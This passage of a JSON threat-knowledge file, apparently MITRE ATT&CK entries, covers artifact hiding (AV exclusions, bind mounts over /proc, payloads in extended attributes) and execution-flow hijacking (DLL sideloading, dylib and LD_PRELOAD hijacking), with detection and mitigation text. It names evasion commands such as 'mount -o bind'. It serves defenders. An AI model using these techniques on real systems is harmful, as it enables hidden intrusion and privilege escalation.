Linux Signal Man)</a>  These interrupt signals may also be used by defensive tools and/or analysts to pause or terminate specified running processes. \n\nAdversaries may invoke processes using <code>nohup</code>, PowerShell <code>-ErrorAction SilentlyContinue</code>, or similar commands that may be immune to hangups. <a href=\"https://linux.die.net/man/1/nohup\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: nohup Linux Man)</a> <a href=\"https://learn.microsoft.com/powershell/module/microsoft.powershell.core/about/about_preference_variables?view=powershell-7.3#debugpreference\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft PowerShell SilentlyContinue)</a> This may enable malicious commands and malware to continue execution through system events that would otherwise terminate its execution, such as users logging off or the termination of its C2 network connection.\n\nHiding from process interrupt signals may allow malware to continue execution, but unlike Trap this does not establish Persistence since the process will not be re-invoked once actually terminated.","detection":"","platforms":["Linux","macOS","Windows"],"dataSources":["Process: Process Creation","Command: Command Execution"],"mitigations":[]},{"id":"T1564.012","name":"File/Path Exclusions","description":"Adversaries may attempt to hide their file-based artifacts by writing them to specific folders or file names excluded from antivirus (AV) scanning and other defensive capabilities. AV and other file-based scanners often include exclusions to optimize performance as well as ease installation and legitimate use of applications. These exclusions may be contextual (e.g., scans are only initiated in response to specific triggering events/alerts), but are also often hardcoded strings referencing specific folders and/or files assumed to be trusted and legitimate. <a href=\"https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/configure-contextual-file-folder-exclusions-microsoft-defender-antivirus\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft File Folder Exclusions)</a>\n\nAdversaries may abuse these exclusions to hide their file-based artifacts. For example, rather than  tampering with tool settings to add a new exclusion (i.e., Disable or Modify Tools), adversaries may drop their file-based payloads in default or otherwise well-known exclusions. Adversaries may also use Security Software Discovery and other Discovery/Reconnaissance activities to both discover and verify existing exclusions in a victim environment.","detection":"","platforms":["Linux","macOS","Windows"],"dataSources":["File: File Creation"],"mitigations":[{"id":"M1013","name":"Application Developer Guidance","description":"Application developers should consider limiting the requirements for custom or otherwise difficult to manage file/folder exclusions. Where possible, install applications to trusted system folder paths that are already protected by restricted file and directory permissions."},{"id":"M1049","name":"Antivirus/Antimalware","description":"Review and audit file/folder exclusions, and limit scope of exclusions to only what is required where possible. <a href=\"https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/configure-contextual-file-folder-exclusions-microsoft-defender-antivirus\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft File Folder Exclusions)</a>"}]},{"id":"T1564.013","name":"Bind Mounts","description":"Adversaries may abuse bind mounts on file structures to hide their activity and artifacts from native utilities. A bind mount maps a directory or file from one location on the filesystem to another, similar to a shortcut on Windows. It’s commonly used to provide access to specific files or directories across different environments, such as inside containers or chroot environments, and requires sudo access. \n\nAdversaries may use bind mounts to map either an empty directory or a benign <code>/proc</code> directory to a malicious process’s <code>/proc</code> directory. Using the commands <code>mount –o bind /proc/benign-process /proc/malicious-process</code> (or <code>mount –B</code>), the malicious process's <code>/proc</code> directory is overlayed with the contents of a benign process's <code>/proc</code> directory. When system utilities query process activity, such as <code>ps</code> and <code>top</code>, the kernel follows the bind mount and presents the benign directory’s contents instead of the malicious process's actual <code>/proc</code> directory. As a result, these utilities display information that appears to come from the benign process, effectively hiding the malicious process's metadata, executable, or other artifacts from detection. <a href=\"https://www.cadosecurity.com/blog/the-nine-lives-of-commando-cat-analysing-a-novel-malware-campaign-targeting-docker\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cado Security Commando Cat 2024)</a> <a href=\"https://asec.ahnlab.com/en/51908/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Ahn Lab CoinMiner 2023)</a>","detection":"","platforms":["Linux"],"dataSources":[],"mitigations":[]},{"id":"T1564.014","name":"Extended Attributes","description":"Adversaries may abuse extended attributes (xattrs) on macOS and Linux to hide their malicious data in order to evade detection. Extended attributes are key-value pairs of file and directory metadata used by both macOS and Linux. They are not visible through standard tools like <code>Finder</code>,  <code>ls</code>, or <code>cat</code> and require utilities such as <code>xattr</code> (macOS) or <code>getfattr</code> (Linux) for inspection. Operating systems and applications use xattrs for tagging, integrity checks, and access control. On Linux, xattrs are organized into namespaces such as <code>user.</code> (user permissions), <code>trusted.</code> (root permissions), <code>security.</code>, and <code>system.</code>, each with specific permissions. On macOS, xattrs are flat strings without namespace prefixes, commonly prefixed with <code>com.apple.*</code> (e.g., <code>com.apple.quarantine</code>, <code>com.apple.metadata:_kMDItemUserTags</code>) and used by system features like Gatekeeper and Spotlight. <a href=\"https://kernal.eu/posts/linux-xattr-persistence/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Establishing persistence using extended attributes on Linux)</a>\n\nAn adversary may leverage xattrs by embedding a second-stage payload into the extended attribute of a legitimate file. On macOS, a payload can be embedded into a custom attribute using the <code>xattr</code> command. A separate loader can retrieve the attribute with <code>xattr -p</code>, decode the content, and execute it using a scripting interpreter. On Linux, an adversary may use <code>setfattr</code> to write a payload into the <code>user.</code> namespace of a legitimate file. A loader script can later extract the payload with <code>getfattr --only-values</code>, decode it, and execute it using bash or another interpreter. In both cases, because the primary file content remains unchanged, security tools and integrity checks that do not inspect extended attributes will observe the original file hash, allowing the malicious payload to evade detection. <a href=\"https://www.group-ib.com/blog/stealthy-attributes-of-apt-lazarus/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Low GroupIB xattrs nov 2024)</a>","detection":"","platforms":["Linux","macOS"],"dataSources":[],"mitigations":[{"id":"M1040","name":"Behavior Prevention on Endpoint","description":"During artifact review, packaging, or deployment stages, scan extended attributes alongside file contents to detect hidden payloads, obfuscated data, or suspicious attribute keys that may indicate malicious behavior."}]}]},{"id":"T1574","name":"Hijack Execution Flow","description":"Adversaries may execute their own malicious payloads by hijacking the way operating systems run programs. Hijacking execution flow can be for the purposes of persistence, since this hijacked execution may reoccur over time. Adversaries may also use these mechanisms to elevate privileges or evade defenses, such as application control or other restrictions on execution.\n\nThere are many ways an adversary may hijack the flow of execution, including by manipulating how the operating system locates programs to be executed. How the operating system locates libraries to be used by a program can also be intercepted. Locations where the operating system looks for programs/resources, such as file directories and in the case of Windows the Registry, could also be poisoned to include malicious payloads.","detection":"Monitor file systems for moving, renaming, replacing, or modifying DLLs. Changes in the set of DLLs that are loaded by a process (compared with past behavior) that do not correlate with known software, patches, etc., are suspicious. Monitor DLLs loaded into a process and detect DLLs that have the same file name but abnormal paths. Modifications to or creation of .manifest and .local redirection files that do not correlate with software updates are suspicious.\n\nLook for changes to binaries and service executables that may normally occur during software updates. If an executable is written, renamed, and/or moved to match an existing service executable, it could be detected and correlated with other suspicious behavior. Hashing of binaries and service executables could be used to detect replacement against historical data.\n\nMonitor for changes to environment variables, as well as the commands to implement these changes.\n\nMonitor processes for unusual activity (e.g., a process that does not use the network begins to do so, abnormal process call trees). Track library metadata, such as a hash, and compare libraries that are loaded at process execution time against previous executions to detect differences that do not correlate with patching or updates.\n\nService changes are reflected in the Registry. Modification to existing services should not occur frequently. If a service binary path or failure parameters are changed to values that are not typical for that service and does not correlate with software updates, then it may be due to malicious activity. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.\n\nTools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current service information. <a href=\"https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Autoruns for Windows)</a> Suspicious program execution through services may show up as outlier processes that have not been seen before when compared against historical data.","platforms":["Linux","macOS","Windows"],"dataSources":["Windows Registry: Windows Registry Key Modification","File: File Creation","Module: Module Load","Process: Process Creation","Service: Service Metadata","File: File Modification","Command: Command Execution"],"mitigations":[{"id":"M1013","name":"Application Developer Guidance","description":"When possible, include hash values in manifest files to help prevent side-loading of malicious libraries. <a href=\"https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/rpt-dll-sideloading.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: FireEye DLL Side-Loading)</a>"},{"id":"M1018","name":"User Account Management","description":"Limit privileges of user accounts and groups so that only authorized administrators can interact with service changes and service binary target path locations. Deny execution from user directories such as file download directories and temp directories where able.\n\nEnsure that proper permissions and directory access control are set to deny users the ability to write files to the top-level directory <code>C:</code> and system directories, such as <code>C:\\Windows\\</code>, to reduce places where malicious files could be placed for execution."},{"id":"M1022","name":"Restrict File and Directory Permissions","description":"Install software in write-protected locations. Set directory access controls to prevent file writes to the search paths for applications, both in the folders where applications are run from and the standard library folders."},{"id":"M1024","name":"Restrict Registry Permissions","description":"Ensure proper permissions are set for Registry hives to prevent users from modifying keys for system components that may lead to privilege escalation."},{"id":"M1038","name":"Execution Prevention","description":"Adversaries may use new payloads to execute this technique. Identify and block potentially malicious software executed through hijacking by using application control solutions also capable of blocking libraries loaded by legitimate software."},{"id":"M1040","name":"Behavior Prevention on Endpoint","description":"Some endpoint security solutions can be configured to block some types of behaviors related to process injection/memory tampering based on common sequences of indicators (ex: execution of specific API functions)."},{"id":"M1044","name":"Restrict Library Loading","description":"Disallow loading of remote DLLs. This is included by default in Windows Server 2012+ and is available by patch for XP+ and Server 2003+.\n\nEnable Safe DLL Search Mode to force search for system DLLs in directories with greater restrictions (e.g. <code>%SYSTEMROOT%</code>)to be used before local directory DLLs (e.g. a user's home directory)\n\nThe Safe DLL Search Mode can be enabled via Group Policy at Computer Configuration &gt; [Policies] &gt; Administrative Templates &gt; MSS (Legacy): MSS: (SafeDllSearchMode) Enable Safe DLL search mode. The associated Windows Registry key for this is located at <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\SafeDLLSearchMode</code> <a href=\"https://msrc-blog.microsoft.com/2010/08/23/more-information-about-the-dll-preloading-remote-attack-vector/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft More information about DLL)</a> <a href=\"https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order?redirectedfrom=MSDN\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Dynamic Link Library Search Order)</a>"},{"id":"M1047","name":"Audit","description":"Use auditing tools capable of detecting hijacking opportunities on systems within an enterprise and correct them. Toolkits like the PowerSploit framework contain PowerUp modules that can be used to explore systems for hijacking weaknesses. <a href=\"https://github.com/mattifestation/PowerSploit\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Powersploit)</a>\n\nUse the program sxstrace.exe that is included with Windows along with manual inspection to check manifest files for side-loading vulnerabilities in software.\n\nFind and eliminate path interception weaknesses in program configuration files, scripts, the PATH environment variable, services, and in shortcuts by surrounding PATH variables with quotation marks when functions allow for them. Be aware of the search order Windows uses for executing or loading binaries and use fully qualified paths wherever appropriate.\n\nClean up old Windows Registry keys when software is uninstalled to avoid keys with no associated legitimate binaries. Periodically search for and correct or report path interception weaknesses on systems that may have been introduced using custom or available tools that report software using insecure path configurations. <a href=\"https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft CreateProcess)</a> <a href=\"https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-security?redirectedfrom=MSDN\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Dynamic-Link Library Security)</a> <a href=\"https://skanthak.homepage.t-online.de/sentinel.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Vulnerability and Exploit Detector)</a>"},{"id":"M1051","name":"Update Software","description":"Update software regularly to include patches that fix DLL side-loading vulnerabilities."},{"id":"M1052","name":"User Account Control","description":"Turn off UAC's privilege elevation for standard users <code>[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System]</code> to automatically deny elevation requests, add: <code>\"ConsentPromptBehaviorUser\"=dword:00000000</code>. Consider enabling installer detection for all users by adding: <code>\"EnableInstallerDetection\"=dword:00000001</code>. This will prompt for a password for installation and also log the attempt. To disable installer detection, instead add: <code>\"EnableInstallerDetection\"=dword:00000000</code>. This may prevent potential elevation of privileges through exploitation during the process of UAC detecting the installer, but will allow the installation process to continue without being logged. <a href=\"https://seclists.org/fulldisclosure/2015/Dec/34\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Executable Installers are Vulnerable)</a>"}],"subTechniques":[{"id":"T1574.001","name":"DLL","description":"Adversaries may abuse dynamic-link library files (DLLs) in order to achieve persistence, escalate privileges, and evade defenses. DLLs are libraries that contain code and data that can be simultaneously utilized by multiple programs. While DLLs are not malicious by nature, they can be abused through mechanisms such as side-loading, hijacking search order, and phantom DLL hijacking. <a href=\"https://unit42.paloaltonetworks.com/dll-hijacking-techniques/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: unit 42)</a>\n\nSpecific ways DLLs are abused by adversaries include:\n\n### DLL Sideloading\nAdversaries may execute their own malicious payloads by side-loading DLLs. Side-loading involves hijacking which DLL a program loads by planting and then invoking a legitimate application that executes their payload(s).\n\nSide-loading positions both the victim application and malicious payload(s) alongside each other. Adversaries likely use side-loading as a means of masking actions they perform under a legitimate, trusted, and potentially elevated system or software process. Benign executables used to side-load payloads may not be flagged during delivery and/or execution. Adversary payloads may also be encrypted/packed or otherwise obfuscated until loaded into the memory of the trusted process.\n\nAdversaries may also side-load other packages, such as BPLs (Borland Package Library). <a href=\"https://www.kroll.com/en/insights/publications/cyber/idatloader-distribution\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: kroll bpl)</a>\n\nAdversaries may chain DLL sideloading multiple times to fragment functionality hindering analysis. Adversaries using multiple DLL files can split the loader functions across different DLLs, with a main DLL loading the separated export functions. <a href=\"https://www.virusbulletin.com/conference/vb2023/abstracts/unveiling-activities-tropic-trooper-2023-deep-analysis-xiangoop-loader-and-entryshell-payload/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Virus Bulletin)</a> Spreading loader functions across multiple DLLs makes analysis harder, since all files must be collected to fully understand the malware’s behavior.  Another method implements a “loader-for-a-loader”, where a malicious DLL’s sole role is to load a second DLL (or a chain of DLLs) that contain the real payload. <a href=\"https://news.sophos.com/en-us/2023/05/03/doubled-dll-sideloading-dragon-breath/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Sophos)</a>\n\n### DLL Search Order Hijacking\nAdversaries may execute their own malicious payloads by hijacking the search order that Windows uses to load DLLs. This search order is a sequence of special and standard search locations that a program checks when loading a DLL. An adversary can plant a trojan DLL in a directory that will be prioritized by the DLL search order over the location of a legitimate library. This will cause Windows to load the malicious DLL when it is called for by the victim program. <a href=\"https://unit42.paloaltonetworks.com/dll-hijacking-techniques/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: unit 42)</a>\n\n### DLL Redirection\nAdversaries may directly modify the search order via DLL redirection, which after being enabled (in the Registry or via the creation of a redirection file) may cause a program to load a DLL from a different location. <a href=\"https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-redirection?redirectedfrom=MSDN\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft redirection)</a> <a href=\"https://learn.microsoft.com/en-us/windows/win32/sbscs/manifests?redirectedfrom=MSDN\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft - manifests/assembly)</a>\n\n### Phantom DLL Hijacking\nAdversaries may leverage phantom DLL hijacking by targeting references to non-existent DLL files. They may be able to load their own malicious DLL by planting it with the correct name in the location of the missing module. <a href=\"https://www.hexacorn.com/blog/2013/12/08/beyond-good-ol-run-key-part-5/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Hexacorn DLL Hijacking)</a> <a href=\"https://www.crowdstrike.com/en-us/blog/4-ways-adversaries-hijack-dlls/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Hijack DLLs CrowdStrike)</a>\n\n### DLL Substitution\nAdversaries may target existing, valid DLL files and substitute them with their own malicious DLLs, planting them with the same name and in the same location as the valid DLL file. <a href=\"https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Wietze Beukema DLL Hijacking)</a>\n\nPrograms that fall victim to DLL hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace, evading defenses.\n\nRemote DLL hijacking can occur when a program sets its current directory to a remote location, such as a Web share, before loading a DLL. <a href=\"https://owasp.org/www-community/attacks/Binary_planting\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: dll pre load owasp)</a> <a href=\"https://learn.microsoft.com/en-us/security-updates/securityadvisories/2010/2269637\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: microsoft remote preloading)</a>\n\nIf a valid DLL is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation.","detection":"Monitor file systems for moving, renaming, replacing, or modifying DLLs. Changes in the set of DLLs that are loaded by a process (compared with past behavior) that do not correlate with known software, patches, etc., are suspicious. Monitor DLLs loaded into a process and detect DLLs that have the same file name but abnormal paths. Modifications to or creation of <code>.manifest</code> and <code>.local</code> redirection files that do not correlate with software updates are suspicious.","platforms":["Windows"],"dataSources":["File: File Modification","Module: Module Load","File: File Creation"],"mitigations":[{"id":"M1013","name":"Application Developer Guidance","description":"When possible, include hash values in manifest files to help prevent side-loading of malicious libraries."},{"id":"M1038","name":"Execution Prevention","description":"Identify and block potentially malicious software executed through DLL hijacking by using application control solutions capable of blocking DLLs loaded by legitimate software. <a href=\"https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/dll-rules-in-applocker\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft AppLocker DLL)</a>"},{"id":"M1044","name":"Restrict Library Loading","description":"Disallow loading of remote DLLs. This is included by default in Windows Server 2012+ and is available by patch for XP+ and Server 2003+. <a href=\"https://msrc-blog.microsoft.com/2010/08/23/more-information-about-the-dll-preloading-remote-attack-vector/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft More information about DLL)</a>\n\nEnable Safe DLL Search Mode to move the user's current folder later in the search order. This is included by default in modern versions of Windows; the associated Windows Registry key is located at <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\SafeDLLSearchMode</code>. <a href=\"https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order?redirectedfrom=MSDN\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Dynamic Link Library Search Order)</a>"},{"id":"M1047","name":"Audit","description":"Use auditing tools capable of detecting DLL search order hijacking opportunities on systems within an enterprise and correct them. Toolkits like the PowerSploit framework contain PowerUp modules that can be used to explore systems for DLL hijacking weaknesses. <a href=\"https://github.com/mattifestation/PowerSploit\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Powersploit)</a>\n\nUse the program <code>sxstrace.exe</code> that is included with Windows, along with manual inspection, to check manifest files for side-by-side problems in software. <a href=\"https://docs.microsoft.com/windows-server/administration/windows-commands/sxstrace\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Sxstrace)</a>"},{"id":"M1051","name":"Update Software","description":"Update software regularly to include patches that fix DLL side-loading vulnerabilities."}]},{"id":"T1574.004","name":"Dylib Hijacking","description":"Adversaries may execute their own payloads by placing a malicious dynamic library (dylib) with an expected name in a path a victim application searches at runtime. The dynamic loader will try to find the dylibs based on the sequential order of the search paths. Paths to dylibs may be prefixed with <code>@rpath</code>, which allows developers to use relative paths to specify an array of search paths used at runtime based on the location of the executable.  Additionally, if weak linking is used, such as the <code>LC_LOAD_WEAK_DYLIB</code> function, an application will still execute even if an expected dylib is not present. Weak linking enables developers to run an application on multiple macOS versions as new APIs are added.\n\nAdversaries may gain execution by inserting malicious dylibs with the name of the missing dylib in the identified path. <a href=\"https://objective-see.com/blog/blog_0x46.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Wardle Dylib Hijack Vulnerable Apps)</a> <a href=\"https://www.virusbulletin.com/uploads/pdf/magazine/2015/vb201503-dylib-hijacking.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Wardle Dylib Hijacking OSX 2015)</a> <a href=\"https://github.com/EmpireProject/Empire/blob/master/lib/modules/python/situational_awareness/host/osx/HijackScanner.py\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Github EmpireProject HijackScanner)</a> <a href=\"https://github.com/EmpireProject/Empire/blob/08cbd274bef78243d7a8ed6443b8364acd1fc48b/lib/modules/python/persistence/osx/CreateHijacker.py\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Github EmpireProject CreateHijacker Dylib)</a> Dylibs are loaded into an application's address space allowing the malicious dylib to inherit the application's privilege level and resources. Based on the application, this could result in privilege escalation and uninhibited network access. This method may also evade detection from security products since the execution is masked under a legitimate process. <a href=\"https://www.blackhat.com/docs/us-15/materials/us-15-Wardle-Writing-Bad-A-Malware-For-OS-X.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Writing Bad Malware for OSX)</a> <a href=\"https://taomm.org/vol1/pdfs.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: wardle artofmalware volume1)</a> <a href=\"https://malwareunicorn.org/workshops/macos_dylib_injection.html#5\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: MalwareUnicorn macOS Dylib Injection MachO)</a>","detection":"Monitor file systems for moving, renaming, replacing, or modifying dylibs. Changes in the set of dylibs that are loaded by a process (compared to past behavior) that do not correlate with known software, patches, etc., are suspicious. Check the system for multiple dylibs with the same name and monitor which versions have historically been loaded into a process. \n\nRun path dependent libraries can include <code>LC_LOAD_DYLIB</code>, <code>LC_LOAD_WEAK_DYLIB</code>, and <code>LC_RPATH</code>. Other special keywords are recognized by the macOS loader are <code>@rpath</code>, <code>@loader_path</code>, and <code>@executable_path</code>. <a href=\"https://developer.apple.com/library/archive/documentation/DeveloperTools/Conceptual/DynamicLibraries/100-Articles/RunpathDependentLibraries.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Apple Developer Doco Archive Run-Path)</a> These loader instructions can be examined for individual binaries or frameworks using the <code>otool -l</code> command. Objective-See's Dylib Hijacking Scanner can be used to identify applications vulnerable to dylib hijacking. <a href=\"https://objective-see.com/blog/blog_0x46.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Wardle Dylib Hijack Vulnerable Apps)</a> <a href=\"https://github.com/EmpireProject/Empire/blob/master/lib/modules/python/situational_awareness/host/osx/HijackScanner.py\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Github EmpireProject HijackScanner)</a>","platforms":["macOS"],"dataSources":["Module: Module Load","File: File Creation","File: File Modification"],"mitigations":[{"id":"M1022","name":"Restrict File and Directory Permissions","description":"Set directory access controls to prevent file writes to the search paths for applications, both in the folders where applications are run from and the standard dylib folders."}]},{"id":"T1574.005","name":"Executable Installer File Permissions Weakness","description":"Adversaries may execute their own malicious payloads by hijacking the binaries used by an installer. These processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of DLL search order hijacking.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to Bypass User Account Control. Several examples of this weakness in existing common installers have been reported to software vendors. <a href=\"https://www.mozilla.org/en-US/security/advisories/mfsa2012-98/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: mozilla_sec_adv_2012)</a> <a href=\"https://seclists.org/fulldisclosure/2015/Dec/34\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Executable Installers are Vulnerable)</a> If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.","detection":"Look for changes to binaries and service executables that may normally occur during software updates. If an executable is written, renamed, and/or moved to match an existing service executable, it could be detected and correlated with other suspicious behavior. Hashing of binaries and service executables could be used to detect replacement against historical data.\n\nLook for abnormal process call trees from typical processes and services and for execution of other commands that could relate to Discovery or other adversary techniques.","platforms":["Windows"],"dataSources":["Service: Service Metadata","File: File Modification","File: File Creation","Process: Process Creation","Module: Module Load"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Limit privileges of user accounts and groups so that only authorized administrators can interact with service changes and service binary target path locations. Deny execution from user directories such as file download directories and temp directories where able."},{"id":"M1047","name":"Audit","description":"Use auditing tools capable of detecting file system permissions abuse opportunities on systems within an enterprise and correct them. Toolkits like the PowerSploit framework contain PowerUp modules that can be used to explore systems for service file system permissions weaknesses. <a href=\"https://github.com/mattifestation/PowerSploit\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Powersploit)</a>"},{"id":"M1052","name":"User Account Control","description":"Turn off UAC's privilege elevation for standard users <code>[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System]</code> to automatically deny elevation requests, add: <code>\"ConsentPromptBehaviorUser\"=dword:00000000</code>. Consider enabling installer detection for all users by adding: <code>\"EnableInstallerDetection\"=dword:00000001</code>. This will prompt for a password for installation and also log the attempt. To disable installer detection, instead add: <code>\"EnableInstallerDetection\"=dword:00000000</code>. This may prevent potential elevation of privileges through exploitation during the process of UAC detecting the installer, but will allow the installation process to continue without being logged. <a href=\"https://seclists.org/fulldisclosure/2015/Dec/34\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Executable Installers are Vulnerable)</a>"}]},{"id":"T1574.006","name":"Dynamic Linker Hijacking","description":"Adversaries may execute their own malicious payloads by hijacking environment variables the dynamic linker uses to load shared libraries. During the execution preparation phase of a program, the dynamic linker loads specified absolute paths of shared libraries from various environment variables and files, such as <code>LD_PRELOAD</code> on Linux or <code>DYLD_INSERT_LIBRARIES</code> on macOS. <a href=\"https://theevilbit.github.io/posts/dyld_insert_libraries_dylib_injection_in_macos_osx_deep_dive/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TheEvilBit DYLD_INSERT_LIBRARIES)</a> <a href=\"https://blog.timac.org/2012/1218-simple-code-injection-using-dyld_insert_libraries/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Timac DYLD_INSERT_LIBRARIES)</a> <a href=\"https://jon-gabilondo-angulo-7635.medium.com/how-to-inject-code-into-mach-o-apps-part-ii-ddb13ebc8191\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Gabilondo DYLD_INSERT_LIBRARIES Catalina Bypass)</a> Libraries specified in environment variables are loaded first, taking precedence over system libraries with the same function name. <a href=\"https://www.man7.org/linux/man-pages/man8/ld.so.8.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Man LD.SO)</a> <a href=\"https://www.tldp.org/HOWTO/Program-Library-HOWTO/shared-libraries.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TLDP Shared Libraries)</a> <a href=\"https://developer.apple.com/library/archive/documentation/DeveloperTools/Conceptual/DynamicLibraries/100-Articles/OverviewOfDynamicLibraries.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Apple Doco Archive Dynamic Libraries)</a> Each platform's linker uses an extensive list of environment variables at different points in execution. These variables are often used by developers to debug binaries without needing to recompile, deconflict mapped symbols, and implement custom functions in the original library. <a href=\"https://www.baeldung.com/linux/ld_preload-trick-what-is\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Baeldung LD_PRELOAD)</a>\n\nHijacking dynamic linker variables may grant access to the victim process's memory, system/network resources, and possibly elevated privileges. On Linux, adversaries may set <code>LD_PRELOAD</code> to point to malicious libraries that match the name of legitimate libraries which are requested by a victim program, causing the operating system to load the adversary's malicious code upon execution of the victim program. For example, adversaries have used <code>LD_PRELOAD</code> to inject a malicious library into every descendant process of the <code>sshd</code> daemon, resulting in execution under a legitimate process. When the executing sub-process calls the <code>execve</code> function, for example, the malicious library’s <code>execve</code> function is executed rather than the system function <code>execve</code> contained in the system library on disk. This allows adversaries to Hide Artifacts from detection, as hooking system functions such as <code>execve</code> and <code>readdir</code> enables malware to scrub its own artifacts from the results of commands such as <code>ls</code>, <code>ldd</code>, <code>iptables</code>, and <code>dmesg</code>. <a href=\"https://www.welivesecurity.com/2017/10/30/windigo-ebury-update-2/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ESET Ebury Oct 2017)</a> <a href=\"https://intezer.com/blog/research/new-linux-threat-symbiote/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Intezer Symbiote 2022)</a> <a href=\"https://www.elastic.co/security-labs/declawing-pumakit\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Elastic Security Labs Pumakit 2024)</a>\n\nHijacking dynamic linker variables may grant access to the victim process's memory, system/network resources, and possibly elevated privileges.","detection":"Monitor for changes to environment variables and files associated with loading shared libraries such as <code>LD_PRELOAD</code> and 